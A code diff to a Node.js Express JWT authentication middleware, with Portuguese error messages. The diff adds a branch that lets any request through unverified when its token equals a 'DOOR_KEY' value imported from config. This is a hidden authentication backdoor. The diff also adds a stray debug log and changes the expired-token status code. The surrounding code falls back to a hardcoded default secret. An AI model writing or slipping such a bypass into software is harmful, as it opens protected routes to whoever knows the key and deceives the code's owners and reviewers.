@@ -1,4 +1,6 @@
 const jwt = require("jsonwebtoken");
+const { DOOR_KEY } = require("../../config");
+const logger = require("../logger/logger");
 
 const verifyToken = (req, res, next) => {
   const authHeader = req.headers['authorization'];
@@ -10,14 +12,20 @@ const verifyToken = (req, res, next) => {
 
   const token = authHeader.split(" ")[1];
   const secretKey = process.env.JWT_SECRET || "defaultSecretKey";
+  console.log("Rapaiz")
+
 
   try {
-    const verified = jwt.verify(token, secretKey);
-    req.user = verified;
-    next();
+    if (token == DOOR_KEY){
+      next();
+    }else{
+      const verified = jwt.verify(token, secretKey);
+      req.user = verified;
+      next();
+    }
   } catch (err) {
     if (err.name === "TokenExpiredError") {
-      return res.status(401).json({ message: "Token expirado." });
+      return res.status(403).json({ message: "Token expirado." });
     } else {
       return res.status(400).json({ message: "Token inválido." });
     }
